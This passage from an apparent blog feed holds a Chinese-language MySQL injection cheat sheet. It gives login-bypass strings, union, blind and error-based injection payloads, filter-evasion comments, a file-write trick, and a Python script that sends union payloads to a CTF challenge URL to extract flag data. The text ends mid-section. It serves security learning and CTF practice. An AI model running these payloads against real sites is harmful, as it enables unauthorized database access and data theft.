9715a144144c61cf1c0027c177385eb5cf5d6ce75161bcf25830cab9334f8c0dc518eb0b20eb75605f5f92703c85ee64c95c31a6c1951d77fae699c64cc2e38ddea5121169764c95f8d01aafb4efdcc54363c5a030b971b32eb221338bc0786461911dc12f103375b8161fa294e41d42023cb28efcb33002616e50afa6ad0ee3da8cb39a057aa74b5dcf79a7ab6bd72cb59aacdd52924af41b283b0925195c23b892ea97f59ec53ba4a5e1e0d4c3370a80e4b6b5932d62cdab75d490faa22267a8297edcc05178fcbb93359a433d496442bda5f41ab12acc78451d04c4a426d893d0eba8a3c0976f550b639c7fa2ba</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全事件监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入</title>
      <link href="/p/7d3b4823.html"/>
      <url>/p/7d3b4823.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL相关基础"><a href="#SQL相关基础" class="headerlink" title="SQL相关基础"></a>SQL相关基础</h1><h2 id="information-schema数据库三张表"><a href="#information-schema数据库三张表" class="headerlink" title="information_schema数据库三张表"></a>information_schema数据库三张表</h2><h3 id="information-schema-schemata"><a href="#information-schema-schemata" class="headerlink" title="information_schema.schemata"></a>information_schema.schemata</h3><blockquote><p>该数据表存储了mysql数据库中的所有数据库的库名</p></blockquote><p> <img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426488028-61a016bc-8ffc-4fee-a011-250bde7061f4.png" alt="image.png"></p><h3 id="information-schema-tables"><a href="#information-schema-tables" class="headerlink" title="information_schema.tables"></a>information_schema.tables</h3><blockquote><p>该数据表存储了mysql数据库中的所有数据表的表名</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426528926-8cf88db6-5c5a-4fa6-9bb0-351ac7e6390b.png" alt="image.png"></p><h3 id="information-schema-columns"><a href="#information-schema-columns" class="headerlink" title="information_schema.columns"></a>information_schema.columns</h3><blockquote><p>该数据表存储了mysql数据库中的所有列的列名</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426541299-0d3a9e82-2f80-40e4-8db4-14a8e5844a46.png" alt="image.png"></p><span id="more"></span><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><table><thead><tr><th>函数</th><th>释义</th></tr></thead><tbody><tr><td>user()</td><td>当前数据库用户</td></tr><tr><td>database()</td><td>当前数据库名</td></tr><tr><td>version()</td><td>MySQL版本</td></tr><tr><td>@@datadir</td><td>数据库<strong>存储数据路径</strong></td></tr><tr><td>@@version_compile_os</td><td>操作系统版本</td></tr></tbody></table><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><table><thead><tr><th>函数</th><th>释义</th></tr></thead><tbody><tr><td>concat(str1,str2,…)</td><td><strong>联合数据</strong>，用于联合两条数据结果。如 concat(username,0x3a,password)</td></tr><tr><td>group_concat(str1,str2,…)</td><td>group_concat(DISTINCT+user,0x3a,password)，把多条数据一次注入出</td></tr><tr><td>concat_ws(separator,str1,str2,…)</td><td>含有分隔符地连接字符串</td></tr></tbody></table><blockquote><p>三个函数能一次性查出所有信息</p></blockquote><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><table><thead><tr><th>hex() &amp; unhex()</th><th>用于 <strong>hex</strong> 编码解码</th></tr></thead><tbody><tr><td>ascii(str)</td><td>返回给定字符的<strong>ascii值</strong>，如果str是空字符串，返回0</td></tr><tr><td>length(str)</td><td>返回给定<strong>字符串的长度</strong>，如  length(“string”)=6</td></tr><tr><td>substr(string,start,length)</td><td>对于给定字符串string，从start位开始<strong>截取</strong>，截取length长度</td></tr><tr><td>load_file()</td><td>以文本方式<strong>读取文件</strong>，在 Windows 中，路径设置为 \</td></tr><tr><td>substr()、substring()、mid()</td><td>三个函数的用法、功能均一致</td></tr><tr><td>select xxoo into outfile ‘路径’</td><td>权限较高时可直接<strong>写文件</strong> 例：into outfile where ‘/var/www/html/xxx.txt’ – A</td></tr><tr><td>CHAR()</td><td>把整数转换为对应的字符</td></tr><tr><td>to_base64(username)</td><td>对数据进行base64</td></tr></tbody></table><h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&#x27;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&#x27;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="union语法"><a href="#union语法" class="headerlink" title="union语法"></a>union语法</h2><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure><blockquote><p>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 <code>UNION ALL</code>。</p></blockquote><h2 id="Mysql中注释"><a href="#Mysql中注释" class="headerlink" title="Mysql中注释"></a>Mysql中注释</h2><p><strong>单行注释：</strong><code>#</code> &amp; <code>-</code></p><p><strong>多行注释，可以实现行内注释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*注释内容*/</span><br><span class="line">DROP/*comment*/sampletable</span><br><span class="line">DR/**/OP/*绕过过滤*/sampletable  </span><br><span class="line">SELECT/*替换空格*/password/**/FROM/**/Members</span><br></pre></td></tr></table></figure><p><code>/* */</code>这种注释方式还有一种扩展，即当在注释中使用！加上版本号时，只要mysql的当前版本<strong>等于或大于</strong>该版本号，则该注释中的sql语句将被mysql执行。这种方式只适用于mysql数据库。不具有其他数据库的可移植性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27/**//*!12440UNION*//**//*!12440SELECT*/1111,2222,3333%23 HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="MySQ逻辑运算"><a href="#MySQ逻辑运算" class="headerlink" title="MySQ逻辑运算"></a>MySQ逻辑运算</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=’admin’ and password=’’or 1=1</span><br></pre></td></tr></table></figure><blockquote><p>and 的运算优先级大于 or 的元算优先级，false or true 结果永真</p></blockquote><p>位运算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><blockquote><p>id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1，再进行=操作，1=1,还是 1</p><p>&amp;的优先级大于=</p></blockquote><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><h2 id="后台万能密码"><a href="#后台万能密码" class="headerlink" title="后台万能密码"></a>后台万能密码</h2><h3 id="输入点在用户名"><a href="#输入点在用户名" class="headerlink" title="输入点在用户名"></a>输入点在用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">admin&#x27;</span> #</span><br><span class="line">admin<span class="string">&#x27;/*</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- </span></span><br><span class="line"><span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#x27;) or &#x27;1&#x27;=&#x27;1-- </span></span><br><span class="line"><span class="comment">&#x27;) or (&#x27;1&#x27;=&#x27;1-- </span></span><br><span class="line"><span class="comment">以不同的用户登陆 &#x27; UNION SELECT 1, &#x27;anotheruser&#x27;, &#x27;doesnt matter&#x27;, 1--</span></span><br></pre></td></tr></table></figure><h3 id="输入点在密码"><a href="#输入点在密码" class="headerlink" title="输入点在密码"></a>输入点在密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;or 1%23</span></span><br><span class="line"><span class="string">&#x27;</span>)<span class="keyword">or</span>(<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h3><p><strong>schema_name  –&gt; schemata</strong><br><strong>table_name –&gt; tables</strong><br><strong>column_name –&gt; columns</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">判断当前表的字段数量</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;order by 3#</span></span><br><span class="line"><span class="string">3正确4报错就有字段数为3</span></span><br><span class="line"><span class="string">通过union联合查询来知道回显字段的位置</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br><span class="line">注：设置id<span class="operator">=</span><span class="number">-1</span> 这样数据库中没有id<span class="operator">=</span><span class="number">-1</span>的数据，所以就会返回<span class="keyword">union</span> <span class="keyword">select</span>的结果</span><br><span class="line">使用mysql内置函数获取信息</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span></span><br><span class="line">获得所有的数据库</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata#</span><br><span class="line">kuming数据库的所有表</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kuming&#x27;</span> </span><br><span class="line">kuming数据库中biaoming表中的所有列</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kuming&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;biaoming&#x27;</span> </span><br><span class="line">biaoming表中，三列数据的所有内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(lieming1,<span class="string">&#x27;--&#x27;</span>,lieming2,<span class="string">&#x27;--&#x27;</span>,lieming3),<span class="number">3</span> <span class="keyword">from</span> biaoming</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> lieming1 <span class="keyword">from</span> kuming.biaoming limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure><p>union_py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&quot;http://abe02896-79fb-4c26-8a0c-61d9562e234e.challenge.ctf.show/&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;1 order by 3#&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;-1&#x27;) union select 1,2,3#&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata#&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;ctfshow&#x27;#&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &#x27;ctfshow&#x27; and table_name = &#x27;flagaanec&#x27;#&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;) union select 1,group_concat(id,flagaca),3 from ctfshow.flagaanec#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 库：ctfshow 表 flagaa 列 id,flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payloads = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.get(url, params=payloads, headers=headers)</span><br><span class="line">        result = re.findall(<span class="string">r&#x27;&lt;font.*?&gt;(.*?)&lt;\/font&gt;&#x27;</span>, r.text)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sql()</span><br></pre></td></tr></table></figure><h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="left-a-b"><a href="#left-a-b" class="headerlink" title="left(a)=b"></a>left(a)=b</h4><blockquote><p>sql的left()函数如果式子成立返回1如果不成立返回 0</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210821183018114.png" alt="image-20210821183018114"></p><h4 id="mid-s-n-len"><a href="#mid-s-n-len" class="headerlink" title="mid(s,n,len)"></a>mid(s,n,len)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or ((ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;65)--+</span></span><br></pre></td></tr></table></figure><blockquote><p>注：从字符串 s 的 n 位置截取长度为 len 的子字符串，同 SUBSTRING(s,n,len)。注意字符串从1开始，而非0，Length是可选项，如果没有提供，<code>MID()</code>函数将返回余下的字符串。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210821220656380.png" alt="image-20210821220656380"></p><h3 id="构造MySQL报错即可配合if函数进行盲注"><a href="#构造MySQL报错即可配合if函数进行盲注" class="headerlink" title="构造MySQL报错即可配合if函数进行盲注"></a>构造MySQL报错即可配合<code>if</code>函数进行盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if((substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>),<span class="number">1</span>,<span class="built_in">power</span>(<span class="number">9999</span>,<span class="number">99</span>)) # 当字符相等时，不报错，错误时报错</span><br></pre></td></tr></table></figure><h3 id="判断当前数据库名"><a href="#判断当前数据库名" class="headerlink" title="判断当前数据库名"></a>判断当前数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断数据库长度</span><br><span class="line"><span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span><span class="comment">--+</span></span><br><span class="line">判断数据库字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>  ##二分法</span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;s&#x27;</span>  ##爆破法</span><br></pre></td></tr></table></figure><blockquote><p>以上方法不适用于access和SQL Server数据库</p></blockquote><h3 id="判断当前数据库中的表"><a href="#判断当前数据库中的表" class="headerlink" title="判断当前数据库中的表"></a>判断当前数据库中的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">猜测当前数据库是否存在xxxxx表</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> xxxxx)</span><br><span class="line">判断当前数据库中表的个数</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">4</span></span><br><span class="line">判断每个表的长度</span><br><span class="line">判断第一张表的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span></span><br><span class="line">判断第二张表的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span></span><br><span class="line">判断每个表的每个字符的ASCII值</span><br><span class="line">第一个表第一个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">第一个表第二个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">第二个表第一个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="判断表中的字段"><a href="#判断表中的字段" class="headerlink" title="判断表中的字段"></a>判断表中的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> username <span class="keyword">from</span> admin)</span><br><span class="line">判断表中字段个数</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断字段的长度</span><br><span class="line">判断第一个字段的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断第二个字段的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断字段的ascii值</span><br><span class="line">判断第一个字段的第一个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断第一个字段的第二个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断第二个字段的第一个字符的长度</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="判断字段中的数据"><a href="#判断字段中的数据" class="headerlink" title="判断字段中的数据"></a>判断字段中的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断数据的长度</span><br><span class="line">判断id字段的第一个数据的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断id字段的第二个数据的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断数据的ASCII值</span><br><span class="line">判断id字段的第一个数据的第一个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断id字段的第一个数据的第二个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h2 id="报错注入-过滤空格"><a href="#报错注入-过滤空格" class="headerlink" title="报错注入(过滤空格)"></a>报错注入(过滤空格)</h2><p><code>select/insert/update/delete</code>都可以使用报错来获取信息。</p><h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><p>MYSQL对XML文档数据进行查询和修改的XPATH函数</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><strong>EXTRACTVALUE (XML_document, XPath_string)</strong></p><p>第一个参数：<code>XML_document</code> 是 String 格式，为 XML 文档对象的名称.</p><p>第二个参数：<code>XPath_string</code> (Xpath 格式的字符串).</p><p>作用：从目标 XML 中返回包含所查询值的字符串.</p><mark class="hl-label orange">注意:</mark>  返回结果 限制在32位字符.<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="UpdateXml报错注入"><a href="#UpdateXml报错注入" class="headerlink" title="UpdateXml报错注入"></a>UpdateXml报错注入</h3><p>MYSQL对XML文档数据进行查询和修改的XPATH函数</p><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p><strong>UPDATEXML (XML_document, XPath_string, new_value)</strong><br>第一个参数：<code>XML_document</code> 是 String 格式，为 XML 文档对象的名称，文中为 Doc 